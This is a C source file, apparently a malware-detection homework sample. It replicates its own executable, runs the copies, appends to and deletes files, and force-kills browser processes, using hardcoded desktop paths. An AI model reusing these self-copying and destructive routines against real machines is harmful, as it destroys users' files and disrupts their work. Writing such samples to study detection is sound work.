/* AUTHOR: astroturf777
   DATE: 1MAY2019
   PURPOSE:
    This program completes the following:
    - It self replicates itself into several new files
    - It Creates several random new files in new locations
    - It deletes several copies of itself
    - It deletes several random files on the computer filesystem
DISCLAIMER: IF ANYONE FINDS THIS CODE AND USES IT FOR MALICIOUS PURPOSES I ASTROTURF777 
CANNOT BE HELD LIABLE
*/

#include <stdio.h>
#include <process.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
    //This loop checks if selfrep1.exe exists to ensure that an endless loop doesn't occur.
    printf("Beginning Main\n");
//    createBatchfile();
    if(fileExist())
    {
        printf("All done\n");
    }else{
        printf("Beginning suspicious activities\n");
        copySelf();
        selfprocessCreation();
        // fileCreate();
        writeFiles();
        deleteFiles();
        randomPIDCreate();
        printf("End of activities\n");
    }
    killProcess();
    printf("All Done\n");
    stopProgram();
    return 0;
}

//This function checks to see if selfrep1.exe exists. If it does, than the program has executed once before.
int fileExist()
{
    if(fopen("\\Users\\Daniel\\Desktop\\selfrep1.exe","r") == NULL) {
        return 0;
    }
    else {
        return 1;
    }
}

//This function uses system calls to copy itself to multiple locations under different names.
int copySelf()
{
    char command[200],command2[200],command3[200],command4[200],command5[200];
    printf("Beginning copy process\n");

    strcpy(command, "cd \\Users\\Daniel\\Desktop" );
    system(command);
    strcpy(command2, "copy \\Users\\Daniel\\Desktop\\RuntimeMalwareDetection\\HW1\\selfrep.exe \\Users\\Daniel\\Desktop\\selfrep1.exe");
    system(command2);
    strcpy(command3, "copy \\Users\\Daniel\\Desktop\\RuntimeMalwareDetection\\HW1\\selfrep.exe \\Users\\Daniel\\selfrep2.exe");
    system(command3);
    strcpy(command4, "copy \\Users\\Daniel\\Desktop\\RuntimeMalwareDetection\\HW1\\selfrep.exe \\Users\\Daniel\\Desktop\\selfrep3.exe");
    system(command4);
    strcpy(command5, "copy \\Users\\Daniel\\Desktop\\RuntimeMalwareDetection\\HW1\\selfrep.exe \\Users\\Daniel\\Desktop\\selfrep4.exe");
    system(command5);
    printf("End copy process\n");

    return 0;

}

//This function executes the three processes that were copied above.
int selfprocessCreation()
{
    printf("Executing self copies\n");
    system("\\Users\\Daniel\\Desktop\\selfrep1.exe");
    system("\\Users\\Daniel\\Desktop\\selfrep3.exe");
    system("\\Users\\Daniel\\Desktop\\selfrep4.exe");
    printf("All clones executed\n");
    return 0;
}

//This function creates 3 random processes by spawning them to other PIDS.
int randomPIDCreate()
{
    printf("Beginning process creation\n");
    system("start \\Windows\\System32\\calc.exe");
    printf("Executed calc\n");
    system("start \\Windows\\System32\\explorer.exe");
    printf("Executed explorer\n");
    system("start \\Windows\\System32\\notepad.exe");
    printf("Executed notepad\n");

    printf("End of process creation\n");

    return 0;
}

//This function kills 2 currently running processes
int killProcess()
{
    printf("Killing four running programs\n");
    system("taskkill /F /IM firefox.exe /T");
    system("taskkill /F /IM chrome.exe /T");
    system("taskkill /F /IM notepad.exe /T");
    system("taskkill /F /IM calculator.exe /T");
    printf("Programs killed\n");

    return 0;
}

//int createBatchfile()
//{
//    FILE *openProcess;
//    char *str = "@echo off\n";
//    char *str1 = "start \"\\Windows\\System32\\\"\n";
//    char *str2 = "start cmd.exe\n";
//    char *str3 = "cd \"\\Windows\\System32\\\"\n";
//    char *str4 = "start notepad.exe\n";
//    char *str5 = "cd \"\\Windows\\System32\\\"\n";
//    char *str6 = "start calc.exe\n";
//    char *str7 = "exit";
//
//    openProcess=fopen("c:\\Users\\Daniel\\Desktop\\openProcess.bat","w+");
//    fwrite(str, 3 , sizeof(str) , openProcess );
//    fclose(openProcess);
//    openProcess=fopen("c:\\Users\\Daniel\\Desktop\\openProcess.bat","a+");
//    fwrite(str1, 6 , sizeof(str1) , openProcess );
//    fclose(openProcess);
//    openProcess=fopen("c:\\Users\\Daniel\\Desktop\\openProcess.bat","a+");
//    fwrite(str2, 4 , sizeof(str2) , openProcess );
//    fclose(openProcess);
//    openProcess=fopen("c:\\Users\\Daniel\\Desktop\\openProcess.bat","a+");
//    fwrite(str3, 6 , sizeof(str3) , openProcess );
//    fclose(openProcess);
//    openProcess=fopen("c:\\Users\\Daniel\\Desktop\\openProcess.bat","a+");
//    fwrite(str4, 5 , sizeof(str4) , openProcess );
//    fclose(openProcess);
//    openProcess=fopen("c:\\Users\\Daniel\\Desktop\\openProcess.bat","a+");
//    fwrite(str5, 6 , sizeof(str5) , openProcess );
//    fclose(openProcess);
//    openProcess=fopen("c:\\Users\\Daniel\\Desktop\\openProcess.bat","a+");
//    fwrite(str6, 4 , sizeof(str6) , openProcess );
//    fclose(openProcess);
//    openProcess=fopen("c:\\Users\\Daniel\\Desktop\\openProcess.bat","a+");
//    fwrite(str7, 1 , sizeof(str7) , openProcess );
//    fclose(openProcess);
//
//    printf("Wrote to file 1\n");
//}

//This function creates 5 random files in random places.
/*int fileCreate()
{

    FILE *rand1,*rand2,*rand3,*rand4,*rand5;
    //These are the random files in random locations
    printf("Opening random files in random locations\n");
    rand1=fopen("c:\\Users\\Daniel\\Desktop\\test1.txt","w");
    rand2=fopen("c:\\Users\\Daniel\\test2.txt","w");
    rand3=fopen("c:\\Users\\Daniel\\Desktop\\test3.txt","w");
    rand4=fopen("c:\\Users\\Daniel\\test4.txt","w");
    rand5=fopen("c:\\Users\\Daniel\\Desktop\\test5.txt","w");
    printf("All random files opened\n");

    fclose(rand1);
    fclose(rand2);
    fclose(rand3);
    fclose(rand4);
    fclose(rand5);
    printf("All random files closed\n");

    return 0;
}*/

//This function writes data to pre-existing files
int writeFiles()
{
    char str[] = "\nI have been appended\n";
    FILE *write2me1,*write2me2,*write2me3,*write2me4;
    printf("Writing to four random files\n");
    //These four commands write to pre-existing files
    write2me1=fopen("c:\\Users\\Daniel\\Desktop\\write2me1.txt", "a");
    fwrite(str, 1 , sizeof(str) , write2me1 );
    printf("Wrote to file 1\n");

    write2me2=fopen("c:\\Users\\Daniel\\Desktop\\write2me2.txt","a");
    fwrite(str, 1 , sizeof(str) , write2me2 );
    printf("Wrote to file 2\n");

    write2me3=fopen("c:\\Users\\Daniel\\Desktop\\write2me3.txt","a");
    fwrite(str, 1 , sizeof(str) , write2me3 );
    printf("Wrote to file 3\n");

    write2me4=fopen("c:\\Users\\Daniel\\Desktop\\write2me4.txt","a");
    fwrite(str, 1 , sizeof(str) , write2me4 );
    printf("Wrote to file 4\n");

    printf("End append to file process\n");

    fclose(write2me1);
    fclose(write2me2);
    fclose(write2me3);
    fclose(write2me4);
    printf("All files closed\n");

    return 0;
}

//This function deletes 2 self files, 2 random files, and 2 pre-existing files.
int deleteFiles()
{
    int ret,ret2,ret3,ret4,ret5,ret6;
    //This code deletes the two self replicated files, 2 newly created files, and 2 random files
    printf("removing 6 random files\n");
    ret=remove("c:\\Users\\Daniel\\Desktop\\selfrep.exe");
    ret2=remove("c:\\Users\\Daniel\\selfrep.exe");
    ret3=remove("c:\\Users\\Daniel\\Desktop\\test1.txt");
    ret4=remove("c:\\Users\\Daniel\\test2.txt");
    ret5=remove("c:\\Users\\Daniel\\Desktop\\random1.txt");
    ret6=remove("c:\\Users\\Daniel\\Desktop\\random2.txt");
    printf("All files removed\n");

    return 0;
}

int stopProgram()
{
  char a_word[100];
  printf ("Enter a word: ");
  scanf ("%s", a_word);
  printf ("You entered: %s\n", a_word);
  return 0;
}

